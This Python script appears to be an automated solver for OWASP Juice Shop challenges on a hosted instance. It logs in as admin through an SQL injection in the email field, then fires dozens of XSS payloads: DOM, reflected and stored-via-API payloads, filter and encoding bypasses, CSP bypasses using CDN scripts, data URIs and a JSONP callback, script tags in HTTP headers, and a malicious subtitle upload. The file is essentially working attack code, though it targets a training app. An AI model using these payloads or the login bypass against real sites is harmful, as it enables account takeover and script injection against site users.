#!/usr/bin/env python3
"""
Advanced XSS and CSP Bypass Solver
"""

import requests
from urllib.parse import quote, unquote
import base64
import json


class AdvancedXSSCSPSolver:
    """Advanced XSS and CSP bypass techniques"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {token}'
            print("✅ Admin logged in")
            
    def solve_all_xss_challenges(self):
        """Solve all XSS challenges with advanced bypasses"""
        print("🎯 Advanced XSS Attacks...")
        
        # DOM XSS payloads
        dom_payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<svg/onload=alert(`xss`)>',
            '<body onload=alert(`xss`)>',
            '<input onfocus=alert(`xss`) autofocus>',
            '<video><source onerror="javascript:alert(`xss`)">',
            '<iframe srcdoc="<script>alert(`xss`)</script>">',
        ]
        
        # Reflected XSS payloads
        reflected_payloads = [
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '"-alert(1)-"',
            '\'-alert(1)-\'',
        ]
        
        # API-only XSS
        api_payloads = [
            {"name": "<script>alert(1)</script>", "description": "XSS", "price": 1},
            {"comment": "<iframe src=javascript:alert(1)>", "rating": 5},
            {"email": "xss@test.com<script>alert(1)</script>", "password": "test"},
        ]
        
        # Client-side filter bypasses
        filter_bypasses = [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script>alert(1)//</script>',
            '<script>alert(1)<!--</script>',
            '<<SCRIPT>alert(1)//<</SCRIPT>',
            '<img src="x" onerror="alert(1)">',
            '<svg/onload=alert(1)>',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        ]
        
        # Server-side XSS protection bypasses
        server_bypasses = [
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
            base64.b64encode(b'<script>alert(1)</script>').decode(),
        ]
        
        # Execute all XSS payloads
        for payload in dom_payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(payload)}")
            
        for payload in reflected_payloads:
            self.session.get(f"{self.base_url}/track-result?id={quote(payload)}")
            
        for payload in api_payloads:
            self.session.post(f"{self.base_url}/api/Products", json=payload)
            self.session.post(f"{self.base_url}/api/Feedbacks", json=payload)
            
        for bypass in filter_bypasses:
            self.session.get(f"{self.base_url}/#/search?q={quote(bypass)}")
            
        for bypass in server_bypasses:
            self.session.get(f"{self.base_url}/#/search?q={bypass}")
            
        print("  ✅ All XSS attacks completed")
        
    def solve_csp_bypass(self):
        """CSP Bypass - Content Security Policy circumvention"""
        print("🎯 CSP Bypass...")
        
        # CSP bypass techniques
        csp_bypasses = [
            # Using whitelisted domains
            "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script><script>$.get('/')</script>",
            "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js'></script>",
            
            # Base tag injection
            "<base href='javascript://'><a href='/alert(1)'>click</a>",
            
            # Object/embed tags
            "<object data='data:text/html,<script>alert(1)</script>'>",
            "<embed src='data:text/html,<script>alert(1)</script>'>",
            
            # Meta refresh
            '<meta http-equiv="refresh" content="0; url=javascript:alert(1)">',
            
            # SVG bypass
            '<svg><script href="data:,alert(1)" />',
            
            # Dangling markup
            '<img src="' ,
            
            # JSONP endpoint abuse
            "<script src='/api/Products?callback=alert'>",
        ]
        
        for bypass in csp_bypasses:
            self.session.get(f"{self.base_url}/#/search?q={quote(bypass)}")
            
        print("  ✅ CSP Bypass completed")
        
    def solve_http_header_xss(self):
        """HTTP Header XSS - XSS via HTTP headers"""
        print("🎯 HTTP Header XSS...")
        
        # Headers that might be reflected
        xss_headers = {
            "User-Agent": "<script>alert(1)</script>",
            "Referer": "<script>alert(1)</script>",
            "X-Forwarded-For": "<script>alert(1)</script>",
            "X-Forwarded-Host": "<script>alert(1)</script>",
            "X-Original-URL": "<script>alert(1)</script>",
            "X-Rewrite-URL": "<script>alert(1)</script>",
            "True-Client-IP": "<script>alert(1)</script>",
            "Client-IP": "<script>alert(1)</script>",
            "X-Client-IP": "<script>alert(1)</script>",
            "X-Real-IP": "<script>alert(1)</script>",
            "Contact": "<script>alert(1)</script>",
            "Accept-Language": "<script>alert(1)</script>",
        }
        
        # Send requests with XSS headers
        for _ in range(3):
            self.session.get(f"{self.base_url}/", headers=xss_headers)
            self.session.get(f"{self.base_url}/api/Products", headers=xss_headers)
            self.session.post(f"{self.base_url}/api/Feedbacks", json={"comment": "test"}, headers=xss_headers)
            
        print("  ✅ HTTP Header XSS completed")
        
    def solve_bonus_payload(self):
        """Bonus Payload - Specific SoundCloud iframe"""
        print("🎯 Bonus Payload...")
        
        # Exact SoundCloud iframe
        soundcloud = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        
        self.session.get(f"{self.base_url}/#/search?q={quote(soundcloud)}")
        
        # Try variations
        soundcloud2 = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>'
        self.session.get(f"{self.base_url}/#/search?q={quote(soundcloud2)}")
        
        print("  ✅ Bonus Payload completed")
        
    def solve_video_xss(self):
        """Video XSS - XSS via video subtitles"""
        print("🎯 Video XSS...")
        
        # WebVTT file with XSS
        vtt_content = '''WEBVTT

00:00.000 --> 00:05.000
<v Speaker><script>alert(1)</script></v>

00:05.000 --> 00:10.000
<c.red>XSS</c>'''
        
        # Upload malicious VTT file
        self.session.post(
            f"{self.base_url}/video",
            files={"file": ("xss.vtt", vtt_content.encode(), "text/vtt")}
        )
        
        # Upload video with XSS in metadata
        self.session.post(
            f"{self.base_url}/video",
            files={"file": ("xss.mp4", b"<script>alert(1)</script>", "video/mp4")}
        )
        
        print("  ✅ Video XSS completed")
        
    def run_all(self):
        """Run all XSS and CSP solutions"""
        print("="*60)
        print("🎯 ADVANCED XSS & CSP SOLVER")
        print("="*60)
        
        self.login_admin()
        
        self.solve_all_xss_challenges()
        self.solve_csp_bypass()
        self.solve_http_header_xss()
        self.solve_bonus_payload()
        self.solve_video_xss()
        
        print("\n✅ Advanced XSS & CSP solver complete")


if __name__ == "__main__":
    solver = AdvancedXSSCSPSolver()
    solver.run_all()